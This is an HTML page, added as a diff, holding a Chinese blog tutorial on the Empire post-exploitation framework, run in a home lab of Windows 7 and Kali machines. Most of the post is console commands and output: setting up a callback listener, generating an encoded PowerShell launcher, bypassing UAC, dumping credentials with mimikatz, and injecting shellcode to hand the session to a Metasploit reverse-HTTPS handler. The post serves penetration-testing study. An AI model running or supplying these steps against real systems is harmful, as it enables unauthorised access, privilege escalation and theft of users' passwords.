@@ -1,0 +1,256 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>渗透利器之Empire--帝国 | Mari0er&#39;s Blog</title>
+<meta name="description" content="">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://mari0er.top/favicon.ico?v=1768205765236">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://mari0er.top/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://mari0er.top">
+        <img class="avatar" src="https://mari0er.top/images/avatar.png?v=1768205765236" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://mari0er.top">
+        <h1 class="site-title">Mari0er&#39;s Blog</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="https://mari0er.top/post/about.html" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+            <div class="feature-container" style="background-image: url('https://tuchuang.looklook.workers.dev/0303/powershell.jpg')">
+            </div>
+          
+          <h2 class="post-title">渗透利器之Empire--帝国</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2018-02-09</span>
+            
+              <span>
+                <i class="icon-pricetags-outline"></i>
+                
+                  <a href="https://mari0er.top/tag/powershell/">
+                    powershell
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://mari0er.top/tag/yu-kong/">
+                    域控
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://mari0er.top/tag/empire/">
+                    empire
+                    
+                  </a>
+                
+              </span>
+            
+          </div>
+          <div class="post-content">
+            <p>  很多人可能对Metasploit(以下简称MSF)并不陌生，但是却很少有人知道Empire，其实Empire也是渗透中的一大利器！</p>
+<!-- more -->
+<p>  Empire具体的操作流程和MSF很像，只不过完成同样的操作，命令可能会有所不同。Empire下载地址请点击<a href="https://github.com/EmpireProject/Empire">这里</a>,下载完后安装即可使用。<br>
+<strong>注意</strong>:安装出错时，可以先运行 ./reset.sh命令,之后再运行 ./install.sh命令进行安装。<br>
+打开empire的界面如下，是不是感觉很高大上！这里对比MSF解释一下参数的意义:</p>
+<blockquote>
+<p><strong>modules:</strong> 获得回话后可利用的模块，版本不同可利用的模块数可能不同<br>
+<strong>listeners:</strong> 相当于MSF中的handler，用于目标回连至Empire<br>
+<strong>agents:</strong> 相当于MSF中的sessions，用于对回连的回话进行操作<br>
+<strong>Win7：</strong> 192.168.10.12　　　　  <strong>Kali：</strong> 192.168.10.18</p>
+</blockquote>
+<figure data-type="image" tabindex="1"><img src="https://tuchuang.looklook.workers.dev/0303/0301_empire.png" alt="" loading="lazy"></figure>
+<h2 id="0x01">0x01</h2>
+<p>  下面，我们来学习一下Empire的使用方法。首先，我们需要创建一个监听listeners,当前版本一共有7种回连方式，这里我们选择http方式，输入info可以看到详细信息，在这里可以修改绑定的IP和端口等信息，最后输入execute即可创建listener。<br>
+<strong>注意：</strong> 创建好listeners后，默认会一直存在Empire中，此时可以输入kill + http来关闭监听的listeners。</p>
+<pre><code>(Empire) &gt; listeners
+(Empire: listeners) &gt; uselistener http
+(Empire: listeners/http) &gt; info
+...
+(Empire: listeners/http) &gt; set Host 192.168.10.18
+(Empire: listeners/http) &gt; set Port 4444
+...
+(Empire: listeners/http) &gt; execute
+[*] Starting listener 'http'
+[+] Listener successfully started!
+(Empire: listeners/http) &gt;
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://tuchuang.looklook.workers.dev/0303/0302_listeners.png" alt="listeners" loading="lazy"></figure>
+<h2 id="0x02">0x02</h2>
+<p>  创建好listeners后，我们需要攻击载荷才能对目标发起攻击。输入back命令返回上一级,输入usestager命令可以看到很多针对Windows和OSX的攻击载荷，比如常用的hta，dll，vbs等。除此之外，还可以直接利用launcher命令来生成攻击载荷，这里以powershell为例，执行完下述代码后即可生成一串攻击代码。如果是使用其他载荷，同样是设置完毕后输入execute即可生成相应的代码或者脚本文件。</p>
+<pre><code>(Empire: listeners/http) &gt; back
+(Empire: listeners) &gt; launcher powershell http
+powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAHIAcwBpAE8ATgBUAGEAQgBsAGU......
+(Empire: listeners) &gt;
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://tuchuang.looklook.workers.dev/0303/0303_stager.png" alt="" loading="lazy"></figure>
+<h2 id="0x03">0x03</h2>
+<p>  接下来就是要让目标执行我们生成的代码或者脚本文件，具体操作可以参考<a href="https://mari0er.top/post/fishing.html">这篇文章</a>的利用方法。输入main命令返回主菜单，可以看到我们生成的一个listeners，待目标运行powershell代码后，就可以看到一条回连信息。之后输入agents命令就可以看到上线的主机，interact相当于MSF中的<strong>session -i</strong>，觉得Name不好记忆可以自己修改agents中的Name值便于输入。</p>
+<pre><code>(Empire: listeners) &gt; main
+(Empire) &gt; agents
+...
+(Empire: agents) &gt; interact HT5EF6RP
+(Empire: HT5EF6RP) &gt; rename mari0er
+(Empire: mari0er) &gt; 
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://tuchuang.looklook.workers.dev/0303/0304.png" alt="" loading="lazy"></figure>
+<h2 id="0x04">0x04</h2>
+<p>  在我们拿到shell后，第一件事应该就是提权，不然很多模块和命令都用不了。Empire的提权非常简单，直接输入<strong>bypassuac+linsteners</strong>即可。提权成功后可以看到一条新的回连信息，再次输入agents可以看到两台上线主机。注意，此时带星号标记的表示提权后的shell，不管shell处于失效或有效状态都会存在Empire中，此时可以输入remove + name来关闭失效的shell。</p>
+<pre><code>(Empire: mari0er) &gt; bypassuac http
+Empire: mari0er) &gt; 
+Job started: 6TZBXY
+[+] Initial agent A1VUC9H8 from 192.168.10.12 now active (Slack)
+(Empire: mari0er) &gt; agents
+...
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://tuchuang.looklook.workers.dev/0303/0306.png" alt="bypass" loading="lazy"></figure>
+<p>拿到提权后的shell有什么用呢？如果渗透内网的话，经常需要输入管理员的登陆密码，此时，抓密码神器mimikatz就派上用场了，在提权后的shell中直接输入mimikatz即可，待抓取完毕后输入creds就可以列出抓取密码的hash值以及明文。<br>
+<img src="https://tuchuang.looklook.workers.dev/0303/0307.png" alt="mimikatz" loading="lazy"></p>
+<h2 id="0x05">0x05</h2>
+<p>  你可能习惯了MSF的操作步骤，觉得Empire有点不顺手，没关系！Empire可以反弹回MSF。值得一提的是，利用提权后的shell反弹回MSF，MSF也可以很简单的提权。看到提权后的MSF回话，是不是觉得很亲切，撸起袖子就是一顿撸。<strong>注意：</strong> 先监听MSF后再执行Empire的注入模块，注意顺序。<br>
+Empire的命令如下：</p>
+<pre><code>(Empire: agents) &gt; interact A1VUC9H8
+(Empire: A1VUC9H8) &gt; usemodule code_execution/invoke_shellcode
+(Empire: powershell/code_execution/invoke_shellcode) &gt; set Lport 8889
+(Empire: powershell/code_execution/invoke_shellcode) &gt; set Lhost 192.168.10.18
+(Empire: powershell/code_execution/invoke_shellcode) &gt; execute
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://tuchuang.looklook.workers.dev/0303/0308.png" alt="" loading="lazy"></figure>
+<p>MSF的命令如下：</p>
+<pre><code>msf &gt; use exploit/multi/handler 
+msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_https
+payload =&gt; windows/meterpreter/reverse_https
+msf exploit(multi/handler) &gt; set lport 8889
+lport =&gt; 8889
+msf exploit(multi/handler) &gt; set lhost 192.168.10.18 
+lhost =&gt; 192.168.10.18
+msf exploit(multi/handler) &gt; exploit 
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://tuchuang.looklook.workers.dev/0303/0309.png" alt="" loading="lazy"></figure>
+<h2 id="0x06">0x06</h2>
+<p>  Empire还有很多模块可以利用，比如键盘记录，屏幕截图，添加注册表后门，查看域渗透等，这里只是记录一下我学习的部分，待以后再慢慢去研究更加好玩的玩法。</p>
+<blockquote>
+<p>作者： Mari0er<br>
+链接： https://mari0er.top/post/empire.html<br>
+版权： 本博客所有文章除特别声明外，均采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！</p>
+</blockquote>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://mari0er.top/post/nethunter.html/">
+              <h3 class="post-title">
+                下一篇：快速打造一台&#34;黑客&#34;手机--Nethunter
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan"></div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  待人友善是修养 独来独往是性格 | <a class="rss" href="https://mari0er.top/atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
